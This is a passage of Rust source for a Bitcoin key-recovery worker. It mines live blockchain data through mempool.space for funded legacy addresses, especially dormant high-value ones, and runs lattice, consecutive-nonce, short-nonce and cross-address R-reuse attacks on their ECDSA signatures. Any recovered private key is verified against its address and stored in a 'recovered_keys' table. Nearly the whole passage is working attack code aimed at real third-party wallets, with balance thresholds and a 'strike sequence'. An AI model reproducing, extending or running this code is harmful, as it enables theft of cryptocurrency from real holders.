                // Adaptive bias estimation: compute bits_known from actual R-value statistics
                let bits_known_estimates = estimate_nonce_bias(&sigs_for_features);
                state.log(&format!("    Adaptive bias estimates: {:?}", bits_known_estimates));

                let mut lattice_found_key = false;
                'lattice_trials: for bits_known in &bits_known_estimates {
                    if lattice_found_key { break; }
                    state.log(&format!("    Trying lattice with bits_known={}...", bits_known));
                    match time::timeout(
                        Duration::from_secs(180),
                        tokio::process::Command::new("./target/release/lattice_attack_rs")
                            .arg(&sigs_file)
                            .arg(&addr)
                            .arg(bits_known.to_string())
                            .output()
                    ).await {
                        Ok(Ok(out3)) => {
                            let stdout = String::from_utf8_lossy(&out3.stdout);
                            if stdout.contains("SUCCESS") {
                                if let Some(key_line) = stdout.lines().find(|l| l.contains("Private Key Found:")) {
                                    let privkey = key_line.split("Found:").last().unwrap_or("").trim().trim_start_matches("0x");
                                    if let Ok(d_bytes) = hex::decode(privkey) {
                                        if let Ok(sk) = k256::ecdsa::SigningKey::from_slice(&d_bytes) {
                                            let vk = sk.verifying_key();
                                            for compressed in [true, false] {
                                                let encoded = vk.to_encoded_point(compressed);
                                                let pubkey_bytes = encoded.as_bytes();
                                                let mut sha256 = sha2::Sha256::new();
                                                sha256.update(pubkey_bytes);
                                                let sha256_hash = sha256.finalize();
                                                let mut ripemd160 = ripemd::Ripemd160::new();
                                                ripemd160.update(&sha256_hash);
                                                let h160 = ripemd160.finalize();
                                                if let Ok(decoded) = bs58::decode(&addr).into_vec() {
                                                    if decoded.len() == 25 && decoded[1..21] == h160[..] {
                                                        state.log(&format!("  [!!!] VERIFIED SUCCESS: Found key for {} (bits_known={})!", addr, bits_known));
                                                        conn.execute(
                                                            "INSERT OR IGNORE INTO recovered_keys (address, privkey_hex, method, found_at) VALUES (?1, ?2, ?3, datetime('now'))",
                                                            params![addr, format!("0x{}", privkey), format!("Lattice HNP (bits_known={})", bits_known)],
                                                        )?;
                                                        lattice_found_key = true;
                                                        break 'lattice_trials;
                                                    }
                                                }
                                            }
                                            if !lattice_found_key {
                                                state.log(&format!("  [!] REJECTED: Found key 0x{} for {} but it did not match address!", privkey, addr));
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        Ok(Err(e)) => {
                            state.log(&format!("    Lattice process error (bits_known={}): {}", bits_known, e));
                        }
                        Err(_) => {
                            state.log(&format!("    Lattice timed out (bits_known={}), trying next estimate...", bits_known));
                        }
                    }
                }

                state.log("  [4/8] Bleichenbacher Fourier Analysis...");
                if let Ok(Ok(out4)) = time::timeout(Duration::from_secs(600), tokio::process::Command::new("./target/release/bleichenbacher_fourier").arg(&sigs_file).output()).await {
                    let stdout = String::from_utf8_lossy(&out4.stdout);
                    if stdout.contains("POTENTIAL HIT") {
                        state.log(&format!("  [!] BLEICHENBACHER-STYLE BIAS DETECTED for {}.", addr));
                        let _ = conn.execute(
                            "INSERT OR IGNORE INTO vulnerabilities (address, type, severity, found_at, details) VALUES (?1, ?2, ?3, datetime('now'), ?4)",
                            params![addr, "Fourier Bias", "High", "Bleichenbacher-style periodicity detected"],
                        );
                    }
                } else {
                    state.log("  [!] Bleichenbacher Fourier Analysis timed out.");
                }

                // [5/8] Consecutive/Small-delta nonce detection
                // If k2 = k1 + delta for small delta, we can recover d algebraically:
                //   From two sigs with same key d: s1 = (z1 + r1*d) / k1, s2 = (z2 + r2*d) / k2
                //   With k2 = k1 + delta, substitute and solve the resulting quadratic.
                //   For delta in {1, 2, ..., small_range}, this is a feasible brute-force.
                state.log("  [5/8] Consecutive Nonce Detection (small-delta brute-force)...");
                {
                    let n_order = BigInt::from_str_radix("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141", 16).unwrap();
                    let mut found_consec = false;
                    // Load full sig data for algebraic recovery
                    let full_sigs: Vec<(BigInt, BigInt, BigInt)> = conn.prepare(
                        "SELECT DISTINCT r_hex, s_hex, z_hex FROM signatures WHERE address = ?1 ORDER BY id LIMIT 256"
                    )?.query_map(params![&addr], |row| {
                        let r: String = row.get(0)?;
                        let s: String = row.get(1)?;
                        let z: String = row.get(2)?;
                        Ok((
                            BigInt::from_str_radix(&r, 16).unwrap_or_default(),
                            BigInt::from_str_radix(&s, 16).unwrap_or_default(),
                            BigInt::from_str_radix(&z, 16).unwrap_or_default(),
                        ))
                    })?.collect::<rusqlite::Result<Vec<_>>>()?;

                    // For each consecutive pair, try delta = 0..1000
                    // k = (z1 - z2 + delta * s2) / (s1 - s2) works when k2 = k1 + delta
                    // Limit pair count to keep runtime bounded: at most 10 pairs from first 20 sigs
                    let consec_limit = full_sigs.len().min(20);
                    'consec_outer: for i in 0..consec_limit.saturating_sub(1) {
                        if found_consec { break; }
                        let (ref r1, ref s1, ref z1) = full_sigs[i];
                        for j in (i+1)..consec_limit.min(i + 10) {
                            let (ref r2, ref s2, ref z2) = full_sigs[j];
                            if r1 == r2 { continue; } // skip R-reuse (handled elsewhere)

                            // Precompute invariants for this (i,j) pair
                            let s_diff = (s1 - s2 + &n_order) % &n_order;
                            if s_diff == BigInt::from(0) { continue; }
                            let s_diff_inv = match mod_inverse_bigint(&s_diff, &n_order) {
                                Some(inv) => inv,
                                None => continue,
                            };
                            let r1_inv = match mod_inverse_bigint(r1, &n_order) {
                                Some(inv) => inv,
                                None => continue,
                            };
                            let base_numerator = (z1 - z2 + &n_order * 4u32) % &n_order;

                            for delta_val in 0i64..1_000 {
                                // k1 = (z1 - z2 + s2 * delta) / (s1 - s2) mod N
                                let numerator = (&base_numerator + s2 * BigInt::from(delta_val)) % &n_order;
                                let k1_candidate = (&numerator * &s_diff_inv) % &n_order;

                                // Derive d from sig 1: d = (s1 * k1 - z1) * r1_inv mod N
                                let d_candidate = ((s1 * &k1_candidate - z1 + &n_order * 4u32) % &n_order * &r1_inv) % &n_order;

                                // Verify with sig 2: s2 == (z2 + r2 * d) * (k1 + delta)^-1 mod N
                                let k2_candidate = (&k1_candidate + BigInt::from(delta_val)) % &n_order;
                                let k2_inv = mod_inverse_bigint(&k2_candidate, &n_order);
                                if k2_inv.is_none() { continue; }
                                let s2_check = ((z2 + r2 * &d_candidate + &n_order * 4u32) % &n_order * k2_inv.as_ref().unwrap()) % &n_order;

                                if &s2_check == s2 {
                                    // Found it! Verify the private key matches the address
                                    let d_hex = format!("{:0>64}", d_candidate.to_str_radix(16));
                                    state.log(&format!("  [!!!] CONSECUTIVE NONCE HIT (delta={})! Candidate key: 0x{}", delta_val, d_hex));

                                    if let Ok(d_bytes) = hex::decode(&d_hex) {
                                        if let Ok(sk) = k256::ecdsa::SigningKey::from_slice(&d_bytes) {
                                            let vk = sk.verifying_key();
                                            for compressed in [true, false] {
                                                let encoded = vk.to_encoded_point(compressed);
                                                let pubkey_bytes = encoded.as_bytes();
                                                let mut sha256 = sha2::Sha256::new();
                                                sha256.update(pubkey_bytes);
                                                let sha256_hash = sha256.finalize();
                                                let mut ripemd160 = ripemd::Ripemd160::new();
                                                ripemd160.update(&sha256_hash);
                                                let h160 = ripemd160.finalize();
                                                if let Ok(decoded) = bs58::decode(&addr).into_vec() {
                                                    if decoded.len() == 25 && decoded[1..21] == h160[..] {
                                                        state.log(&format!("  [!!!] VERIFIED: Consecutive nonce key for {} (delta={})", addr, delta_val));
                                                        conn.execute(
                                                            "INSERT OR IGNORE INTO recovered_keys (address, privkey_hex, method, found_at) VALUES (?1, ?2, ?3, datetime('now'))",
                                                            params![addr, format!("0x{}", d_hex), format!("Consecutive Nonce (delta={})", delta_val)],
                                                        )?;
                                                        found_consec = true;
                                                        break 'consec_outer;
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                    if !found_consec {
                        state.log("    No consecutive nonce pattern found.");
                    }
                }

                // [6/8] GCD-based weakness: if GCD of multiple nonce-derived values is large,
                // the nonce space is restricted. Check GCD of (s*r_inv mod N) pairs.
                state.log("  [6/8] GCD Nonce Analysis...");
                {
                    let n_order = BigInt::from_str_radix("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141", 16).unwrap();
                    // Compute k*r values: for each sig, s*k = z + r*d, so differences
                    // (s1*r2 - s2*r1) relate to nonce structure.
                    // If nonces share a common factor, GCD will reveal it.
                    let full_sigs: Vec<(BigInt, BigInt, BigInt)> = conn.prepare(
                        "SELECT DISTINCT r_hex, s_hex, z_hex FROM signatures WHERE address = ?1 ORDER BY id LIMIT 50"
                    )?.query_map(params![&addr], |row| {
                        let r: String = row.get(0)?;
                        let s: String = row.get(1)?;
                        let z: String = row.get(2)?;
                        Ok((
                            BigInt::from_str_radix(&r, 16).unwrap_or_default(),
                            BigInt::from_str_radix(&s, 16).unwrap_or_default(),
                            BigInt::from_str_radix(&z, 16).unwrap_or_default(),
                        ))
                    })?.collect::<rusqlite::Result<Vec<_>>>()?;

                    if full_sigs.len() >= 3 {
                        // Compute cross products: s_i * r_j - s_j * r_i for pairs
                        // These equal (z_i*r_j - z_j*r_i) + d*(r_i*r_j - r_j*r_i) = z_i*r_j - z_j*r_i
                        // (the d terms cancel!) So we get k-independent values.
                        // Cross_ij = s_i * r_j - s_j * r_i mod N
                        // If nonces are related, GCD of these values may be small/structured.
                        let mut cross_vals = Vec::new();
                        for i in 0..full_sigs.len().min(10) {
                            for j in (i+1)..full_sigs.len().min(10) {
                                let cross = (&full_sigs[i].1 * &full_sigs[j].0 - &full_sigs[j].1 * &full_sigs[i].0 + &n_order * 4u32) % &n_order;
                                if cross != BigInt::from(0) {
                                    cross_vals.push(cross);
                                }
                            }
                        }
                        if cross_vals.len() >= 2 {
                            let mut g = cross_vals[0].clone();
                            for v in &cross_vals[1..] {
                                g = gcd_bigint(&g, v);
                            }
                            let g_bits = g.bits();
                            if g_bits < 200 && g_bits > 1 {
                                state.log(&format!("    [!] GCD anomaly: cross-product GCD has only {} bits (expected ~256). Possible restricted nonce space.", g_bits));
                                let _ = conn.execute(
                                    "INSERT OR IGNORE INTO vulnerabilities (address, type, severity, found_at, details) VALUES (?1, ?2, ?3, datetime('now'), ?4)",
                                    params![addr, "GCD Nonce Anomaly", "High", format!("Cross-product GCD: {} bits (expected ~256)", g_bits)],
                                );
                            } else {
                                state.log(&format!("    GCD check: {} bits (normal)", g_bits));
                            }
                        }
                    }
                }

                state.log("  [7/8] Statistical Anomaly Detection (Hybrid Scorer)...");
                if sigs_for_features.len() < 5 {
                    state.log(&format!("    Skipping anomaly detection: Only {} unique nonces (need ≥5 for meaningful statistics).", sigs_for_features.len()));
                } else {
                    match run_neural_inference(state, &sigs_for_features).await {
                        Ok(prob) => {
                            state.log(&format!("    P(vulnerable): {:.4}", prob));
                            if prob > 0.7 {
                                let severity = if prob > 0.9 { "Critical" } else { "High" };
                                state.log(&format!("    [!!!] ANOMALY DETECTED for {} (P={:.4}, {}): Nonce generation shows strong non-randomness.", addr, prob, severity));
                                let _ = conn.execute(
                                    "INSERT OR IGNORE INTO vulnerabilities (address, type, severity, found_at, details) VALUES (?1, ?2, ?3, datetime('now'), ?4)",
                                    params![addr, "Statistical Anomaly", severity, format!("P(vulnerable)={:.4} — deterministic scorer flagged entropy/bias/correlation anomalies", prob)],
                                );
                            } else if prob > 0.5 {
                                state.log(&format!("    [~] Moderate anomaly signal for {} (P={:.4}). Flagging for re-analysis with more signatures.", addr, prob));
                                let _ = conn.execute(
                                    "INSERT OR IGNORE INTO vulnerabilities (address, type, severity, found_at, details) VALUES (?1, ?2, ?3, datetime('now'), ?4)",
                                    params![addr, "Statistical Anomaly", "Medium", format!("P(vulnerable)={:.4} — borderline, needs more signatures", prob)],
                                );
                            }
                        }
                        Err(e) => state.log(&format!("    Anomaly detection error: {}", e)),
                    }
                }

                // [8/8] Short Nonce Direct Search (incremental point addition)
                // If a signature has a very short R value, the nonce may have been
                // generated by a weak RNG. Use fast sequential EC point addition to
                // test candidate k values without expensive per-iteration scalar mult.
                state.log("  [8/8] Short Nonce Direct Search...");
                {
                    use k256::elliptic_curve::sec1::FromEncodedPoint;
                    use k256::elliptic_curve::PrimeField;

                    let n_order = BigInt::from_str_radix("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141", 16).unwrap();

                    // Get known pubkey for this address to use as verification target
                    let pubkey_hex: Option<String> = conn.query_row(
                        "SELECT pubkey_hex FROM signatures WHERE address = ?1 AND pubkey_hex IS NOT NULL LIMIT 1",
                        params![&addr], |row| row.get(0)
                    ).ok();

                    let target_point = pubkey_hex.as_ref().and_then(|pk_hex| {
                        let pk_bytes = hex::decode(pk_hex).ok()?;
                        let encoded = k256::EncodedPoint::from_bytes(&pk_bytes).ok()?;
                        let affine = k256::AffinePoint::from_encoded_point(&encoded);
                        if bool::from(affine.is_some()) {
                            Some(k256::ProjectivePoint::from(affine.unwrap()))
                        } else {
                            None
                        }
                    });

                    if target_point.is_none() {
                        state.log("    No public key available, skipping.");
                    } else {
                        let target = target_point.unwrap();
                        let short_sigs: Vec<(BigInt, BigInt, BigInt)> = conn.prepare(
                            "SELECT r_hex, s_hex, z_hex FROM signatures WHERE address = ?1"
                        )?.query_map(params![&addr], |row| {
                            let r: String = row.get(0)?;
                            let s: String = row.get(1)?;
                            let z: String = row.get(2)?;
                            Ok((
                                BigInt::from_str_radix(&r, 16).unwrap_or_default(),
                                BigInt::from_str_radix(&s, 16).unwrap_or_default(),
                                BigInt::from_str_radix(&z, 16).unwrap_or_default(),
                            ))
                        })?.collect::<rusqlite::Result<Vec<_>>>()?;

                        let candidates: Vec<_> = short_sigs.iter()
                            .filter(|(r, _, _)| r.bits() < 200)
                            .collect();

                        if candidates.is_empty() {
                            state.log("    No short-R signatures found.");
                        } else {
                            state.log(&format!("    {} short-R sigs, searching for weak nonces...", candidates.len()));
                            let mut found = false;

                            'bsgs_outer: for (r, s, z) in &candidates {
                                let r_bits = r.bits();
                                let max_k: u64 = if r_bits < 64 { 1 << 20 }
                                    else if r_bits < 128 { 1 << 18 }
                                    else { 1 << 16 };

                                let r_inv = match mod_inverse_bigint(r, &n_order) {
                                    Some(inv) => inv,
                                    None => continue,
                                };

                                // d(k) = (s*k - z) * r_inv mod n
                                // d(k+1) - d(k) = s * r_inv (constant step in private key space)
                                // So pubkey(k+1) = pubkey(k) + step_point where step_point = (s*r_inv)*G
                                let step_bi = (s * &r_inv) % &n_order;
                                let step_bytes = bigint_to_32bytes(&step_bi);
                                let step_scalar = match k256::Scalar::from_repr(step_bytes.into()).into_option() {
                                    Some(sc) => sc,
                                    None => continue,
                                };
                                let step_point = k256::ProjectivePoint::GENERATOR * step_scalar;

                                // Start point: d(1) = (s - z) * r_inv mod n
                                let d1_bi = ((s - z + &n_order * 4u32) % &n_order * &r_inv) % &n_order;
                                let d1_bytes = bigint_to_32bytes(&d1_bi);
                                let d1_scalar = match k256::Scalar::from_repr(d1_bytes.into()).into_option() {
                                    Some(sc) => sc,
                                    None => continue,
                                };
                                let mut current = k256::ProjectivePoint::GENERATOR * d1_scalar;

                                state.log(&format!("    Searching k=1..{} for {}-bit R...", max_k, r_bits));

                                for k_val in 1u64..=max_k {
                                    if current == target {
                                        let d_bi = ((s * BigInt::from(k_val) - z + &n_order * 4u32) % &n_order * &r_inv) % &n_order;
                                        let d_hex = format!("{:0>64}", d_bi.to_str_radix(16));
                                        state.log(&format!("  [!!!] SHORT NONCE HIT! k={}, key for {}: 0x{}", k_val, addr, d_hex));
                                        conn.execute(
                                            "INSERT OR IGNORE INTO recovered_keys (address, privkey_hex, method, found_at) VALUES (?1, ?2, ?3, datetime('now'))",
                                            params![addr, format!("0x{}", d_hex), format!("Short Nonce (k={})", k_val)],
                                        )?;
                                        found = true;
                                        break 'bsgs_outer;
                                    }
                                    current += step_point;
                                }
                            }
                            if !found {
                                state.log("    No short nonce key recovered.");
                            }
                        }
                    }
                }

                Ok(())
            }
            .await;

            let _ = std::fs::remove_file(&sigs_file);
            result
        }
        .await;

        match strike_result {
            Ok(()) => {
                conn.execute(
                    "UPDATE addresses SET sigs_scanned = 1, processing_by = NULL, processing_since = NULL WHERE address = ?1",
                    params![&addr],
                )?;
                state.log(&format!("  [-] Strike sequence concluded for {}. Marked as scanned.", addr));
            }
            Err(e) => {
                let _ = conn.execute(
                    "UPDATE addresses SET processing_by = NULL, processing_since = NULL WHERE address = ?1",
                    params![&addr],
                );
                state.log(&format!("  [!] Strike sequence failed for {}: {}", addr, e));
            }
        }
    }
    Ok(true)
}


// --- Cross-Address R-Value Reuse Scanner ---
// Checks for shared R values across DIFFERENT addresses — the most exploitable ECDSA weakness.
// If two signatures from different addresses share the same R value, the nonce k was reused,
// and the private key can be recovered algebraically from either signature.
async fn run_cross_address_reuse_scan(state: &mut WorkerState) -> Result<()> {
    let conn = Connection::open(DB_FILE)?;
    conn.pragma_update(None, "busy_timeout", &30000)?;
    let n_order = BigInt::from_str_radix("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141", 16).unwrap();

    // Find R values that appear in signatures from MORE THAN ONE address
    let mut stmt = conn.prepare(
        "SELECT r_hex, COUNT(DISTINCT address) as addr_count, COUNT(*) as sig_count
         FROM signatures
         GROUP BY r_hex
         HAVING COUNT(DISTINCT address) > 1
         ORDER BY addr_count DESC
         LIMIT 100"
    )?;
    let shared_r: Vec<(String, i64, i64)> = stmt.query_map([], |row| {
        Ok((row.get(0)?, row.get(1)?, row.get(2)?))
    })?.flatten().collect();

    if shared_r.is_empty() {
        state.log("[Cross-R] No cross-address R-reuse found.");
        return Ok(());
    }

    state.log(&format!("[Cross-R] Found {} shared R values across addresses!", shared_r.len()));

    for (r_hex, addr_count, sig_count) in &shared_r {
        state.log(&format!("[Cross-R] R={:.16}... shared by {} addresses ({} sigs)", r_hex, addr_count, sig_count));

        // Get all signatures with this R value
        let mut sig_stmt = conn.prepare(
            "SELECT s.address, s.r_hex, s.s_hex, s.z_hex, s.pubkey_hex
             FROM signatures s
             JOIN addresses a ON s.address = a.address
             WHERE s.r_hex = ?1 AND a.balance > 0
             ORDER BY s.address"
        )?;
        let sigs: Vec<(String, String, String, String, String)> = sig_stmt.query_map(params![r_hex], |row| {
            Ok((row.get(0)?, row.get(1)?, row.get(2)?, row.get(3)?, row.get(4)?))
        })?.flatten().collect();

        if sigs.len() < 2 { continue; }

        // Try every pair — same R means same k, so: d = (z1*s2 - z2*s1) / (r*(s1 - s2)) mod n
        for i in 0..sigs.len() {
            for j in (i+1)..sigs.len() {
                let (ref addr1, _, ref s1_hex, ref z1_hex, _) = sigs[i];
                let (ref addr2, _, ref s2_hex, ref z2_hex, _) = sigs[j];

                let s1 = BigInt::from_str_radix(s1_hex, 16).unwrap_or_default();
                let s2 = BigInt::from_str_radix(s2_hex, 16).unwrap_or_default();
                let z1 = BigInt::from_str_radix(z1_hex, 16).unwrap_or_default();
                let z2 = BigInt::from_str_radix(z2_hex, 16).unwrap_or_default();
                let r_val = BigInt::from_str_radix(r_hex, 16).unwrap_or_default();

                if s1 == s2 { continue; } // Same sig entirely, skip

                // k = (z1 - z2) / (s1 - s2) mod n
                let s_diff = (&s1 - &s2 + &n_order * 4u32) % &n_order;
                let s_diff_inv = match mod_inverse_bigint(&s_diff, &n_order) {
                    Some(inv) => inv,
                    None => continue,
                };
                let k = ((&z1 - &z2 + &n_order * 4u32) % &n_order * &s_diff_inv) % &n_order;

                // d = (s1 * k - z1) / r mod n
                let r_inv = match mod_inverse_bigint(&r_val, &n_order) {
                    Some(inv) => inv,
                    None => continue,
                };
                let d = ((&s1 * &k - &z1 + &n_order * 4u32) % &n_order * &r_inv) % &n_order;

                let d_hex = format!("{:0>64}", d.to_str_radix(16));

                // Verify against both addresses
                for target_addr in [addr1, addr2] {
                    if let Ok(d_bytes) = hex::decode(&d_hex) {
                        if let Ok(sk) = k256::ecdsa::SigningKey::from_slice(&d_bytes) {
                            let vk = sk.verifying_key();
                            for compressed in [true, false] {
                                let encoded = vk.to_encoded_point(compressed);
                                let pubkey_bytes = encoded.as_bytes();
                                let mut sha256 = sha2::Sha256::new();
                                sha256.update(pubkey_bytes);
                                let sha256_hash = sha256.finalize();
                                let mut ripemd160 = ripemd::Ripemd160::new();
                                ripemd160.update(&sha256_hash);
                                let h160 = ripemd160.finalize();
                                if let Ok(decoded) = bs58::decode(target_addr).into_vec() {
                                    if decoded.len() == 25 && decoded[1..21] == h160[..] {
                                        state.log(&format!("[Cross-R] [!!!] KEY RECOVERED for {} via cross-address R-reuse!", target_addr));
                                        let _ = conn.execute(
                                            "INSERT OR IGNORE INTO recovered_keys (address, privkey_hex, method, found_at) VALUES (?1, ?2, ?3, datetime('now'))",
                                            params![target_addr, format!("0x{}", d_hex), "Cross-Address R-Reuse"],
                                        );
                                        let _ = conn.execute(
                                            "INSERT OR IGNORE INTO vulnerabilities (address, type, severity, found_at, details) VALUES (?1, ?2, ?3, datetime('now'), ?4)",
                                            params![target_addr, "Nonce Reuse (Cross-Address)", "CRITICAL",
                                                format!("R-value {} shared with {}. Private key recovered.", r_hex, if target_addr == addr1 { addr2 } else { addr1 })],
                                        );
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    Ok(())
}

// --- Main Loop & Other Worker Modes (Simplified) ---

async fn run_scanner(state: &mut WorkerState) -> Result<()> {
    state.log("Checking target queue status...");
    let conn = Connection::open(DB_FILE)?;
    conn.pragma_update(None, "busy_timeout", &30000)?;

    // Check how many ACTIONABLE addresses need fetching (exclude receive-only with transactions=1)
    let unfetched: i64 = conn.query_row(
        "SELECT COUNT(*) FROM addresses WHERE balance > 0 AND (sigs_fetched = 0 OR sigs_fetched IS NULL) AND (transactions IS NULL OR transactions >= 2)",
        [], |r| r.get(0)
    ).unwrap_or(0);

    let pending_analysis: i64 = conn.query_row(
        "SELECT COUNT(*) FROM addresses WHERE balance > 0 AND (analyzed = 0 OR analyzed IS NULL)",
        [], |r| r.get(0)
    ).unwrap_or(0);

    let pending_strike: i64 = conn.query_row(
        "SELECT COUNT(*) FROM addresses WHERE balance > 0 AND (sigs_scanned = 0 OR sigs_scanned IS NULL) AND vulnerability_score > 0",
        [], |r| r.get(0)
    ).unwrap_or(0);

    state.log(&format!("Pipeline status: {} unfetched (actionable), {} pending analysis, {} pending strike", unfetched, pending_analysis, pending_strike));

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(30))
        .build()?;

    // Phase 1: Scan recent blocks for new P2PKH spenders (only if low backlog)
    let mut new_count = 0u32;
    if unfetched > 200 {
        state.log("Sufficient actionable unfetched targets. Skipping recent-block scan.");
    } else {
        state.log("Expanding target pool: scanning recent blocks for P2PKH spenders...");

    // Try fetching from mempool.space recent blocks API
    let blocks_resp = client.get("https://mempool.space/api/blocks/tip/height")
        .send().await;

    if let Ok(resp) = blocks_resp {
        if let Ok(height_str) = resp.text().await {
            if let Ok(tip_height) = height_str.trim().parse::<u64>() {
                // Scan a few recent blocks for P2PKH spenders
                for offset in 0..3u64 {
                    let block_height = tip_height - offset;
                    let block_hash_url = format!("https://mempool.space/api/block-height/{}", block_height);
                    let hash_resp = client.get(&block_hash_url).send().await;
                    if let Ok(hash_r) = hash_resp {
                        if let Ok(block_hash) = hash_r.text().await {
                            let block_hash = block_hash.trim();
                            let txs_url = format!("https://mempool.space/api/block/{}/txids", block_hash);
                            if let Ok(txs_r) = client.get(&txs_url).send().await {
                                if let Ok(txids_json) = txs_r.text().await {
                                    if let Ok(txids) = serde_json::from_str::<Vec<String>>(&txids_json) {
                                        // Sample up to 20 txids per block to avoid rate limits
                                        for txid in txids.iter().take(20) {
                                            let tx_url = format!("https://mempool.space/api/tx/{}", txid);
                                            if let Ok(tx_r) = client.get(&tx_url).send().await {
                                                if let Ok(tx_json) = tx_r.json::<Value>().await {
                                                    // Extract input addresses that use legacy scripts (P2PKH)
                                                    if let Some(vins) = tx_json["vin"].as_array() {
                                                        for vin in vins {
                                                            if let Some(prevout) = vin.get("prevout") {
                                                                let script_type = prevout["scriptpubkey_type"].as_str().unwrap_or("");
                                                                let addr = prevout["scriptpubkey_address"].as_str().unwrap_or("");
                                                                let value = prevout["value"].as_u64().unwrap_or(0);
                                                                // Only P2PKH (legacy ECDSA) with meaningful value
                                                                if script_type == "p2pkh" && !addr.is_empty() && value > 100000 {
                                                                    let exists: bool = conn.query_row(
                                                                        "SELECT COUNT(*) > 0 FROM addresses WHERE address = ?1",
                                                                        params![addr], |r| r.get(0)
                                                                    ).unwrap_or(true);
                                                                    if !exists {
                                                                        let balance_btc = value as f64 / 100_000_000.0;
                                                                        let _ = conn.execute(
                                                                            "INSERT OR IGNORE INTO addresses (address, balance, status, potential_weakness, sigs_fetched, analyzed, vulnerability_score) VALUES (?1, ?2, 'Spent/Active', 'None Identified', 0, 0, 0.0)",
                                                                            params![addr, balance_btc],
                                                                        );
                                                                        new_count += 1;
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                            // Rate limit: 100ms between tx fetches
                                            time::sleep(Duration::from_millis(100)).await;
                                        }
                                    }
                                }
                            }
                        }
                    }
                    time::sleep(Duration::from_millis(500)).await;
                }
            }
        }
    }

    if new_count > 0 {
        state.log(&format!("Scanner discovered {} new P2PKH addresses from recent blocks.", new_count));
    } else {
        state.log("No new P2PKH addresses found in this scan cycle.");
    }
    } // end of recent-block scan gate

    // --- Phase 2: Discover high-value dormant legacy addresses ---
    // Query blockchain.info for rich legacy (1...) addresses with balance > 0.5 BTC
    // These are prime targets: old wallets, potentially weak ECDSA implementations.
    let high_value_count: i64 = conn.query_row(
        "SELECT COUNT(*) FROM addresses WHERE balance > 0.5 AND (transactions IS NULL OR transactions >= 2)",
        [], |r| r.get(0)
    ).unwrap_or(0);

    if high_value_count < 2000 {
        state.log("Scanning for high-value dormant legacy addresses (> 0.5 BTC)...");
        let mut hv_count = 0u32;

        // Scan older blocks (2009-2014 era) for P2PKH spenders — the golden age of weak PRNGs
        // Pick random block heights from early Bitcoin history
        let early_ranges = [
            (1, 100_000),        // 2009-2011
            (100_000, 250_000),  // 2011-2013
            (250_000, 400_000),  // 2013-2016 (Android SecureRandom, Blockchain.info bugs)
        ];

        for (range_start, range_end) in &early_ranges {
            // Pick a random block from this era
            let block_height = range_start + (rand::random::<u64>() % (range_end - range_start));
            let hash_url = format!("https://mempool.space/api/block-height/{}", block_height);
            time::sleep(Duration::from_millis(1500)).await;

            let hash_resp = client.get(&hash_url).send().await;
            if let Ok(hash_r) = hash_resp {
                if let Ok(block_hash) = hash_r.text().await {
                    let block_hash = block_hash.trim();
                    let txs_url = format!("https://mempool.space/api/block/{}/txids", block_hash);
                    time::sleep(Duration::from_millis(1500)).await;

                    if let Ok(txs_r) = client.get(&txs_url).send().await {
                        if let Ok(txids_json) = txs_r.text().await {
                            if let Ok(txids) = serde_json::from_str::<Vec<String>>(&txids_json) {
                                state.log(&format!("  Scanning block {} ({} txs) for high-value P2PKH...", block_height, txids.len()));
                                // Sample up to 30 txids
                                for txid in txids.iter().take(30) {
                                    time::sleep(Duration::from_millis(500)).await;
                                    let tx_url = format!("https://mempool.space/api/tx/{}", txid);
                                    if let Ok(tx_r) = client.get(&tx_url).send().await {
                                        if let Ok(tx_json) = tx_r.json::<Value>().await {
                                            // Check inputs for P2PKH spenders
                                            if let Some(vins) = tx_json["vin"].as_array() {
                                                for vin in vins {
                                                    if let Some(prevout) = vin.get("prevout") {
                                                        let script_type = prevout["scriptpubkey_type"].as_str().unwrap_or("");
                                                        let addr = prevout["scriptpubkey_address"].as_str().unwrap_or("");
                                                        if script_type == "p2pkh" && !addr.is_empty() && addr.starts_with('1') {
                                                            // Check current balance via API
                                                            let exists: bool = conn.query_row(
                                                                "SELECT COUNT(*) > 0 FROM addresses WHERE address = ?1",
                                                                params![addr], |r| r.get(0)
                                                            ).unwrap_or(true);
                                                            if !exists {
                                                                // Fetch current balance
                                                                time::sleep(Duration::from_millis(1000)).await;
                                                                let bal_url = format!("https://mempool.space/api/address/{}", addr);
                                                                if let Ok(bal_r) = client.get(&bal_url).send().await {
                                                                    if let Ok(bal_json) = bal_r.json::<Value>().await {
                                                                        let funded = bal_json["chain_stats"]["funded_txo_sum"].as_u64().unwrap_or(0);
                                                                        let spent = bal_json["chain_stats"]["spent_txo_sum"].as_u64().unwrap_or(0);
                                                                        let tx_count = bal_json["chain_stats"]["tx_count"].as_u64().unwrap_or(0);
                                                                        let balance_sat = funded.saturating_sub(spent);
                                                                        let balance_btc = balance_sat as f64 / 100_000_000.0;

                                                                        if balance_btc > 0.5 && tx_count >= 2 {
                                                                            let _ = conn.execute(
                                                                                "INSERT OR IGNORE INTO addresses (address, balance, status, potential_weakness, sigs_fetched, analyzed, vulnerability_score, transactions) VALUES (?1, ?2, 'Dormant', 'None Identified', 0, 0, 0.0, ?3)",
                                                                                params![addr, balance_btc, tx_count],
                                                                            );
                                                                            hv_count += 1;
                                                                            state.log(&format!("  [+] Found: {} ({:.4} BTC, {} txs)", addr, balance_btc, tx_count));
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                            // Also check outputs that went to legacy addresses
                                            if let Some(vouts) = tx_json["vout"].as_array() {
                                                for vout in vouts {
                                                    let script_type = vout["scriptpubkey_type"].as_str().unwrap_or("");
                                                    let addr = vout["scriptpubkey_address"].as_str().unwrap_or("");
                                                    let value = vout["value"].as_u64().unwrap_or(0);
                                                    // Only check high-value outputs to legacy addresses
                                                    if script_type == "p2pkh" && !addr.is_empty() && addr.starts_with('1') && value > 50_000_000 {
                                                        let exists: bool = conn.query_row(
                                                            "SELECT COUNT(*) > 0 FROM addresses WHERE address = ?1",
                                                            params![addr], |r| r.get(0)
